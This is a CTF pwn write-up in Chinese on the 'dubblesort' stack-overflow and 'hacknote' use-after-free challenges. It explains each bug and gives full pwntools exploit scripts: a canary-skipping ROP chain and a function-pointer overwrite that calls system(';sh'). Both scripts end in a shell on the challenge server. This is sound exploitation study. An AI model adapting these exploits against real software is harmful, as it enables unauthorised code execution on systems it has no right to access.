# dubble sort + hacknote

## dubble sort

#### 漏洞分析

漏洞在于程序没有对输入的size进行限制导致size可以很大，从而导致数据栈溢出。

```c
 __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &size);//没有检查size
  buf_size = size;
  if ( size )
  {
    v4 = buf;
    for ( i = 0; i < size; ++i )
    {
      __printf_chk(1, "Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", v4);
      buf_size = size;
      v4 += 4;
    }
  }
```

#### 漏洞利用

这个漏洞的利用，首先通过name没有\x00截断进行libc地址泄露之后，溢出ROP可以直接得到shell。

```
__printf_chk(1, "What your name :");
  read(0, name, 0x40u);//没有\x00
  __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
```

但是题目有很多陷阱。

首先，题目开启了canary所以需要泄露canary但是如果选择泄露libc就无法泄露canary。这里的技巧是在使用scanf读入整数时，输入"+"可以跳过一次输入，返回值为0。这样就可以跳过canary而不进行覆盖。

第二点，题目的sort函数会对buffer里的数据进行排序，所以输入的时候一定要让数值从小到大进行排列，否则可能会打乱原数据的顺序无法ROP。

#### EXP：

```python
#coding=utf-8
from pwn import *
local = 0
exec_file="./dubblesort"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("node3.buuoj.cn",28073)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *$rebase(0x00000B17)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("",str(idx))
def add(size):
    return 

def delete(idx):
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]

#debug()
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33
a.sendafter("What your name :","a"*0x1c)
a.recvuntil("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")
libc_base = u32(a.recv(4)) - 0x1244 -0x1b0000
fuck(libc_base)
canary_off = 23
ebp_off = 31
ROP_chain = p32(0x3ac6c + libc_base)
binsh = libc.search('/bin/sh').next() + libc_base 
a.sendlineafter("How many numbers do you what to sort :",str(38))
for i in range(24):
    a.recvuntil("Enter the "+str(i)+ " number : ")
    a.sendline(str(0))
a.recvuntil("Enter the "+str(24)+ " number : ")
a.sendline('+')
for i in range(10):
    a.recvuntil("Enter the "+str(25+i)+ " number : ")
    a.sendline(str(0x00000417 + libc_base)) 
a.recvuntil("Enter the "+str(35)+ " number : ")
a.sendline(str(libc.sym["system"] + libc_base)) 
for i in range(2):   
    a.recvuntil("Enter the "+str(36+i)+ " number : ")
    a.sendline(str(binsh))

a.interactive()
```

## hacknote

#### 漏洞分析

典型的菜单题没有，edit。

首先来看一下note的结构体。

```c
00000000 note_info       struc ; (sizeof=0x8, mappedto_7)
00000000                                         ; XREF: .bss:note_/r
00000000 func_ptr        dd ?                    ; XREF: add+40/r
00000000                                         ; add+61/w ...
00000004 note_ptr        dd ?
00000008 note_info       ends
```

前四个字节是函数地址，通常是保存的puts的地址，在show的时候会直接调用打印note。后四个字节是note的chunk的地址。

漏洞是一个UAF。

```c
printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= times )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&note_ + v1) )
  {
    free((void *)(*(&note_ + v1))->note_ptr);
    free(*(&note_ + v1));//两个指针都没有清零
    puts("Success");
  }
```

#### 漏洞利用

首先泄露libc，还是可以使用unsorted bin进行泄露。

因为只给了5次申请的机会所以没有办法使用double free。先申请一个0x8的note0释放掉，这样0x10的bins里面就有两个chunk。第一个是info，第二个是note。再申请一个不是0x8的note1释放掉，这样bins就会是这样的：info1->info0->note0==。这样再申请一个0x8的note就可以对info0进行编辑。把func改成sysytem，note地址改成"；sh"。这个；主要是为了将sh与前面的垃圾命令分开，这样system就可以执行两条命令。==

之后再show note0就可以拿到shell。

这里的知识点主要就是怎么样将sh命令和垃圾数据进行分割。

#### EXP:

```python
#coding=utf-8
from pwn import *
local = 0
exec_file="./hacknote"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("node3.buuoj.cn",29876)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x8048A38
    b *0x0804893D
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("Note size :",str(size))
    a.sendafter("Content :",str(content))
    return 

def delete(idx):
    menu(2)
    a.sendlineafter("Index :",str(idx))
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    menu(3)
    a.sendlineafter("Index :",str(idx))
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33

add(0x80,"aaa")#0
add(0x8,"aaa")#1
delete(0)
add(0x68,"a")#2
#debug()
show(2)
libc_base = u32(a.recv(4)) - 0x1b3761 -0x100
fuck(libc_base)

delete(1)
delete(2)
payload = p32(libc_base + libc.sym["system"]) + ";sh"
#debug()
add(0x8,payload)#3
show(1)
a.interactive()
```

